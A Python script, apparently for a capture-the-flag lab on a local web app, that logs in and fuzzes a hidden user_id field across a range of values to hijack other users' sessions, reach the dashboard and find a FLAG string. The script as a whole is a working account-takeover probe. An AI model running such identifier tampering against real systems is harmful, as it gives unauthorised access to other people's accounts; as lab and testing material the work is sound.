import requests
import re
from http.cookies import SimpleCookie

base_url = "http://127.0.0.1:32883"

# Test range around known value 10032
test_range = range(10020, 10041)

print(f"[*] Testing user_id range: {test_range.start} to {test_range.stop-1}")
print(f"[*] Looking for user_id values that result in different session cookies\n")

success_count = 0
flag_found = False
cookie_values = {}

for user_id in test_range:
    session = requests.Session()
    
    try:
        # Step A: POST username
        step_a_data = {'username': 'test'}
        resp_a = session.post(f"{base_url}/", data=step_a_data, allow_redirects=True)
        
        # Step C: POST credentials with fuzzed user_id
        step_c_data = {
            'username': 'test',
            'password': 'test',
            'user_id': str(user_id)
        }
        resp_c = session.post(f"{base_url}/password/test", data=step_c_data, allow_redirects=False)
        
        # Extract session cookie from Set-Cookie header
        session_cookie = None
        if 'set-cookie' in resp_c.headers:
            set_cookie = resp_c.headers['set-cookie']
            # Parse session value
            if 'session=' in set_cookie:
                session_cookie = set_cookie.split('session=')[1].split(';')[0]
                cookie_values[user_id] = session_cookie
                
                # Manually set cookie for next request
                session.cookies.set('session', session_cookie)
        
        # Step D: GET dashboard with the session cookie
        resp_d = session.get(f"{base_url}/dashboard", allow_redirects=True)
        
        status = resp_d.status_code
        content_len = len(resp_d.content)
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', resp_d.text)
        
        if flag_match:
            print(f"\n{'='*80}")
            print(f"[!!! FLAG FOUND !!!] user_id={user_id}")
            print(f"[!] Session cookie: {session_cookie}")
            print(f"[!] Status: {status} | Length: {content_len}B")
            print(f"[!] FLAG: {flag_match.group(0)}")
            print(f"[!] Full Response:")
            print(resp_d.text)
            print(f"{'='*80}\n")
            flag_found = True
            success_count += 1
        elif status == 200 and 'dashboard' in resp_d.url.lower():
            # Successfully accessed dashboard (not redirected to login)
            print(f"\n[SUCCESS] user_id={user_id}")
            print(f"  Session cookie: {session_cookie}")
            print(f"  Status: {status} | Length: {content_len}B")
            print(f"  Final URL: {resp_d.url}")
            print(f"  Response content:")
            print(resp_d.text)
            success_count += 1
        elif session_cookie:
            # Track which cookies we get
            print(f"[INFO] user_id={user_id} → cookie={session_cookie[:30]}... → redirected to {resp_d.url}")
            
    except Exception as e:
        print(f"[ERROR] user_id={user_id}: {str(e)}")

print(f"\n{'='*80}")
print(f"[SUMMARY]")
print(f"  Range tested: {test_range.start} to {test_range.stop-1}")
print(f"  Total tests: {len(test_range)}")
print(f"  Successful dashboard accesses: {success_count}")
print(f"  Flag found: {flag_found}")

# Check if all cookies are the same
if cookie_values:
    unique_cookies = set(cookie_values.values())
    print(f"  Unique session cookies generated: {len(unique_cookies)}")
    if len(unique_cookies) == 1:
        print(f"  -> All user_id values produce same cookie (vulnerability not exploitable via user_id)")
    else:
        print(f"  -> Different user_id values produce different cookies")
        for uid, cookie in cookie_values.items():
            print(f"     user_id={uid}: {cookie[:50]}...")

print(f"{'='*80}")

